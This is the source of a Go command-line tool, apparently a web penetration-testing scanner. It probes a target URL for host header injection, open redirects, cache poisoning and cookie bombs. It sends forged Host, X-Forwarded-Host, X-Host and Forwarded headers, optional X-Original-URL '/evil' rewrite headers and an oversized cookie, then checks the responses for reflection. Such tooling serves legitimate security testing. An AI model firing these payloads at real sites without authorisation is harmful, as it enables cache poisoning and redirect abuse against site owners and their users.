package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

type Attempt struct {
	name              string
	host              string
	xHost             string
	xForwardedHost    string
	forwarded         string
	xRealIP           string
	enableCachePoison bool
	enableCookieBomb  bool
}

func sendRequest(client *http.Client, req *http.Request) (*http.Response, error) {
	return client.Do(req)
}

func newRequest(method, url string, a Attempt) (*http.Request, error) {
	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		return nil, err
	}

	req.Host = a.host

	// Custom/exploitable headers
	if a.xHost != "" {
		req.Header.Set("X-Host", a.xHost)
	}
	if a.xForwardedHost != "" {
		req.Header.Set("X-Forwarded-Host", a.xForwardedHost)
	}
	if a.xRealIP != "" {
		req.Header.Set("X-Real-IP", a.xRealIP)
	}
	if a.forwarded != "" {
		req.Header.Set("Forwarded", a.forwarded)
	}

	// Optional: Cache poisoning attack simulation
	if a.enableCachePoison {
		req.Header.Set("X-Forwarded-Scheme", "http")
		req.Header.Set("X-Original-URL", "/evil")
		req.Header.Set("X-Rewrite-URL", "/evil")
	}

	// Optional: Cookie Bomb attack simulation
	if a.enableCookieBomb {
		largeCookie := strings.Repeat("A", 1000)
		req.Header.Set("Cookie", "bomb="+largeCookie)
	}

	return req, nil
}

func analyzeResponse(resp *http.Response, body string, a Attempt, testHost string) {
	var issues []string

	// 🔎 Open Redirect detection usando testHost dinâmico
	location := resp.Header.Get("Location")
	if location != "" && strings.Contains(strings.ToLower(location), strings.ToLower(testHost)) {
		issues = append(issues, fmt.Sprintf("⚠ Possible OPEN REDIRECT (%s found in Location header)", testHost))
	}

	// 🔎 Host Header Injection detection (reflexão do host usado)
	headersToCheck := []string{
		resp.Header.Get("Location"),
		resp.Header.Get("Content-Location"),
		resp.Header.Get("Referer"),
		resp.Header.Get("X-Powered-By"),
		body,
	}

	for _, h := range headersToCheck {
		if strings.Contains(h, a.host) || strings.Contains(h, a.xForwardedHost) {
			issues = append(issues, fmt.Sprintf("⚠ Possible HOST HEADER INJECTION (reflection of %s or %s detected)", a.host, a.xForwardedHost))
			break
		}
	}

	// 🔎 Cookie Bomb detection
	for key, values := range resp.Header {
		if strings.ToLower(key) == "set-cookie" {
			for _, val := range values {
				if strings.Contains(val, "bomb=") && len(val) > 500 {
					issues = append(issues, "⚠ Possible COOKIE BOMB (large Set-Cookie header)")
				}
			}
		}
	}

	// Print detected issues
	for _, issue := range issues {
		fmt.Println("   ", issue)
	}
}

func handleRedirects(client *http.Client, url, initialHost string, cachePoison, cookieBomb bool) {
	attempts := []Attempt{
		{
			name: "Host",
			host: initialHost,
		},
		{
			name:           "X-Forwarded-Host",
			host:           initialHost,
			xForwardedHost: initialHost,
		},
		{
			name:      "Forwarded",
			host:      initialHost,
			forwarded: fmt.Sprintf("for=192.168.1.1;proto=http;host=%s", initialHost),
		},
		{
			name:  "X-Host",
			host:  initialHost,
			xHost: initialHost,
		},
		{
			name:           "X-Forwarded-Host + X-Real-IP",
			host:           initialHost,
			xForwardedHost: initialHost,
			xRealIP:        "127.0.0.1",
		},
		{
			name:              "All Combined",
			host:              initialHost,
			xHost:             initialHost,
			xForwardedHost:    initialHost,
			xRealIP:           "192.168.1.100",
			forwarded:         fmt.Sprintf("for=192.168.1.1;proto=https;host=%s", initialHost),
			enableCachePoison: cachePoison,
			enableCookieBomb:  cookieBomb,
		},
	}

	var wg sync.WaitGroup
	for i, attempt := range attempts {
		wg.Add(1)
		go func(i int, a Attempt) {
			defer wg.Done()
			req, err := newRequest("GET", url, a)
			if err != nil {
				fmt.Printf("❌ [%s] Failed to create request: %v\n\n", a.name, err)
				return
			}

			resp, err := sendRequest(client, req)
			if err != nil {
				fmt.Printf("❌ [%s] Request error: %v\n\n", a.name, err)
				return
			}
			defer resp.Body.Close()

			bodyBytes, _ := io.ReadAll(resp.Body)
			body := string(bodyBytes)

			fmt.Printf("🔎 [%d] %s\n", i+1, a.name)
			if a.xHost != "" {
				fmt.Printf("   ↳ X-Host: %s\n", a.xHost)
			}
			if a.xForwardedHost != "" {
				fmt.Printf("   ↳ X-Forwarded-Host: %s\n", a.xForwardedHost)
			}
			if a.xRealIP != "" {
				fmt.Printf("   ↳ X-Real-IP: %s\n", a.xRealIP)
			}
			if a.forwarded != "" {
				fmt.Printf("   ↳ Forwarded: %s\n", a.forwarded)
			}
			if a.enableCachePoison {
				fmt.Printf("   ⚠ Cache poisoning headers enabled\n")
			}
			if a.enableCookieBomb {
				fmt.Printf("   ⚠ Cookie bomb attack included\n")
			}

			if resp.StatusCode >= 300 && resp.StatusCode < 400 {
				location := resp.Header.Get("Location")
				if location != "" {
					fmt.Printf("   ↪ Redirected to: %s\n", location)
				} else {
					fmt.Printf("   ⚠ Redirect without 'Location' header (Status: %d)\n", resp.StatusCode)
				}
			} else {
				fmt.Printf("   ✅ Status: %d %s\n", resp.StatusCode, http.StatusText(resp.StatusCode))
			}

			analyzeResponse(resp, body, a, initialHost)
			fmt.Println()
		}(i, attempt)
	}
	wg.Wait()
}

func main() {
	url := flag.String("url", "", "Target URL to test (required)")
	testHostInjection := flag.String("test-host-injection", "google.com", "Host to inject (default: google.com)")
	enableCachePoison := flag.Bool("cache-poison", false, "Include cache poisoning payload")
	enableCookieBomb := flag.Bool("cookie-bomb", false, "Include cookie bomb payload")
	flag.Parse()

	if *url == "" {
		fmt.Println("❌ Error: -url parameter is required")
		fmt.Println("Usage example:")
		fmt.Println("  ./hh-injection -url https://site.com -test-host-injection teste.com -cache-poison -cookie-bomb")
		os.Exit(1)
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	handleRedirects(client, *url, *testHostInjection, *enableCachePoison, *enableCookieBomb)
}
